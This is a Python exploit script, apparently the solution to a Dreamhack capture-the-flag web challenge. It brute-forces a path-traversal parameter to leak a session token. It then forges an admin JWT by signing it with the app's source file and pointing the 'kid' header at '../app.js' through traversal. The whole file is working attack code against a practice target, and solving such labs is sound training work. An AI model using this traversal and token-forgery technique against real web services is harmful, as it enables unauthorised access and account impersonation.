import requests
import re
import jwt

url = "http://host8.dreamhack.games:18296/"
s = requests.Session()

# flag 1
for i in range(256):
    suffix = format(i, "02x")

    print(f"Trying: flag{suffix}")

    res = s.get(url, params={
        'fn': f'../flag{suffix}.txt'
    })

    if "file not found" not in res.text.lower():
        token = re.findall(r"new token(.+)", res.text)[0].strip()

        print("> Token:", token)
        break

s.cookies.clear()
s.cookies.set('session', token)

res = s.get(f'{url}/cat/flag')

flag1 = re.findall(r'(DH{.+)', res.text)[0].strip()
print("Flag 1:", flag1)

# flag 2
with open("deploy/app.js", 'r') as f:
    key = f.read()

token = jwt.encode(
    {
        "filename": 'app.js',
        "username": "cat_master"
    },
    key,
    algorithm="HS256",
    headers={
        "kid": f"../app.js"
    }
)

s.cookies.clear()
s.cookies.set('session', token)

res = s.get(f'{url}/cat/admin')

flag2 = re.findall(r'for you (.+})', res.text)[0].strip()
print("Flag 2:", flag2)

print("Flag:", flag1 + flag2)